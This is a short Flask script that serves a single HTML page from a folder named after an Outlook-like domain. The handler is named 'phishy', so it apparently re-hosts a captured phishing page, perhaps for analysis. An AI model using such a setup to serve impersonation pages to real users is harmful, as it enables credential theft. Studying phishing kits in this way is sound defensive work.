from flask import Flask, render_template

app = Flask(__name__, static_folder='', template_folder='www.outlooksotf_cln_mailcln.filesusr.com/html')

@app.route('/html/e766f6_03f39d7024f5289eaae8609ccfe16002.html')
def phishy():
    return render_template('e766f6_03f39d7024f5289eaae8609ccfe16002.html')

if __name__ == '__main__':
    app.run('0.0.0.0', 80)